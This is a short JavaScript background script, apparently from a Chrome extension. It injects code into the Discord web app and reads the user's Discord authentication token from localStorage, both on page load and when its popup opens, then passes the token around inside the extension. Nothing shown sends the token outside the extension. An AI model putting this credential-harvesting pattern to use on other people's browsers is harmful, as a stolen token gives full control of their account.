chrome.tabs.onUpdated.addListener(sendToken)
chrome.runtime.onMessage.addListener(function(message,sender,sendResponse){
    if (message.text == "popup opened") {
        chrome.tabs.query({active: true, lastFocusedWindow: true}, tabs => {
            if(tabs[0]) {
                if(tabs[0].url == "https://discord.com/channels/@me") {
                    chrome.scripting.executeScript(
                        {
                            target: { tabId: tabs[0].id },
                            function: getToken,
                        },
                        (results) => {
                            let token = results[0].result
                            if(token) {
                                chrome.runtime.sendMessage( { token: token } )
                            }
                        }
                    )
                }
            }
        });
    }
});

 function getToken() {
    return localStorage['token']
}

function sendToken(tabId, changeInfo, tab) {
    if(changeInfo.status === 'complete') {
        chrome.tabs.query({active: true, lastFocusedWindow: true}, tabs => {
            if(tab) {
                if(tab.url == "https://discord.com/channels/@me") {
                    chrome.scripting.executeScript(
                        {
                            target: { tabId: tab.id },
                            function: getToken,
                        },
                        (results) => {
                            let token = results[0].result
                            if(token) {
                                chrome.runtime.sendMessage( { token: token } )
                            }
                        }
                    )
                }
            }
        });
    }
 }